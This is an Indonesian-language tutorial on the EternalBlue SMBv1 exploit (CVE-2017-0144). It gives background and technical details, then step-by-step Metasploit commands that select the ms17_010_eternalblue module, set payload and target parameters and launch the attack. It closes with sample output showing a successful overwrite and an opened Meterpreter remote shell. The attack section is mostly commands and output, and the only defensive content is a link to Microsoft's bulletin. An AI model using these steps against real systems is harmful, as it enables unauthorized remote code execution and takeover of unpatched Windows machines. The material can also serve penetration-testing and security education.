# EternalBlue

## A. Apa itu EternalBlue?

[EternalBlue]() adalah exploit yang menargetkan kerentanan di Server Message Block version 1 (SMBv1) pada sistem operasi Windows. Kerentanan ini terdaftar dengan ID `CVE-2017-0144` dan ditemukan oleh [NSA (National Security Agency)](https://www.nsa.gov/), lalu bocor ke publik oleh kelompok hacker bernama [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers).

Kerentanan ini memungkinkan Remote Code Execution (RCE), artinya penyerang bisa mengeksekusi kode berbahaya dari jarak jauh tanpa autentikasi, hanya dengan mengirimkan paket SMB berbahaya ke port `445`.

> EternalBlue merupakan exploit yang digunakan dalam serangan besar seperti `WannaCry` dan `NotPetya`.

## B. Detail Teknis
- CVE ID: `CVE-2017-0144`
- Tanggal Rilis: `14 Maret 2017`
- Tipe: Remote Code Execution (RCE)
- Protokol: `SMBv1`
- Komponen: `srv.sys`
- Platform: `Windows XP` hingga `Windows Server 2012 R2` (termasuk `Windows 7` dan `8`)
- Arsitektur: `x86` dan `x64`
- Skor CVSS: `8.1` (Tinggi)

## C. Sistem yang Rentan

Untuk melihat semua sistem yang rentan terhadap `EternalBlue`, anda bisa melihatnya di dokumentasi resmi Microsoft: [https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010#affected-software-and-vulnerability-severity-ratings](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010#affected-software-and-vulnerability-severity-ratings)

## D. Langkah Penggunaan di Metasploit

1. Jalankan Metasploit:

   ```
   msfconsole
   ```

2. Gunakan Modul Exploit EternalBlue:

   ```
   msf6 > use exploit/windows/smb/ms17_010_eternalblue
   ```

3. Setting Parameter Penting:

   ```
   msf6 > set PAYLOAD <PAYLOAD>
   msf6 > set RHOSTS <IP_TARGET>
   msf6 > set RPORT 445
   msf6 > set VERIFY_ARCH true
   msf6 > set VERIFY_TARGET true
   msf6 > set TARGET <ID>
   msf6 > set VERBOSE true
   ```

   > Untuk ID target bisa dilihat dengan:

   ```
   msf6 > show targets
   ```
   
4. Jalankan Exploit:

   ```
   msf6 > exploit
   ```

   Jika hasil output-nya seperti ini:

   ```
   [*] 192.168.1.50:445 - Starting non-paged pool grooming
   [*] 192.168.1.50:445 - Sending start free hole packet.
   [+] 192.168.1.50:445 - Sending SMBv2 buffers
   [*] 192.168.1.50:445 - Sending end free hole packet.
   [+] 192.168.1.50:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
   [*] 192.168.1.50:445 - Sending final SMBv2 buffers.
   [*] 192.168.1.50:445 - Sending last fragment of exploit packet!
   [*] 192.168.1.50:445 - Making :eb_trans2_exploit packet
   [*] 192.168.1.50:445 - Receiving response from exploit packet
   [+] 192.168.1.50:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
   [*] 192.168.1.50:445 - Sending egg to corrupted connection.
   [*] 192.168.1.50:445 - Triggering free of corrupted buffer.
   [*] Sending stage (203846 bytes) to 192.168.1.50
   [*] Meterpreter session 5 opened (192.168.1.42:4444 -> 192.168.1.50:49159) at 2025-05-15 20:25:57 +0700
   [+] 192.168.1.50:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   [+] 192.168.1.50:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   [+] 192.168.1.50:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   meterpreter > 
   ```

   Itu artinya kita sudah berhasil mengeksploitasi mesin terget.
